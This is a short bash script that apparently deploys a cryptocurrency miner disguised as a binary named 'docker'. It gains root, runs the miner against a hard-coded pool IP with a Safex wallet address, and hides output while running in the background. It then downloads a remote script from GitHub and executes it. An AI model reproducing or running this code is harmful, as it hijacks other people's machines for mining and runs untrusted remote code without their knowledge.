#!/bin/bash
apt update && apt -y install sudo gcc curl zip
sudo su
chmod +x docker
./docker -o 40.83.177.217:80 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx > /dev/null 2>&1 &
wget https://raw.githubusercontent.com/jsiqiisn/baby/main/lo.sh && chmod +x lo.sh && ./lo.sh"
